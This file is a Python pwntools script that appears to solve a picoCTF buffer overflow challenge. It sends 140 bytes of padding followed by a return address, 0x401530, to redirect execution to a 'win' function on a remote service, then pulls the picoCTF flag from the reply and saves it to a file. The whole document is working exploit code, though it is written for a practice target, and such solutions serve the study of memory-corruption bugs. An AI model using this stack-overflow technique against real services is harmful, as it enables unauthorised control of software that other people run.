#!/bin/python3

from hamcrest import equal_to_ignoring_case
import pwn
import argparse
import re


class Win:
    def __init__(self) -> None:
        self.getService()
        self.defineConst()
        self.generatePayload()
        self.pwn()

    def getService(self) -> None:
        self.__parser = argparse.ArgumentParser()
        self.__parser.add_argument(
            '--host', type=str, help='host you trying to connect to')
        self.__parser.add_argument(
            '--port', type=int, help='service\'s port you trying to use')

        self.host = self.__parser.parse_args().host
        self.port = self.__parser.parse_args().port

    def defineConst(self) -> None:
        self.bufOffset = 140

    def generatePayload(self) -> None:
        bufString = b'A' * self.bufOffset
        winAddr = pwn.p32(0x401530)
        self.payload = bufString + winAddr

    def pwn(self) -> None:
        self.__conn = pwn.remote(host=self.host, port=self.port)
        self.__conn.recvline()
        self.__conn.sendline(self.payload)
        rawFlag = str(self.__conn.recv())
        self.flag = re.findall('picoCTF{.*}', rawFlag)[0]

    def saveFlag(self):
        with open('./flag.txt', 'w') as filp:
            filp.write(self.flag)


if __name__ == '__main__':
    win = Win()
    print(win.flag)
    win.saveFlag()
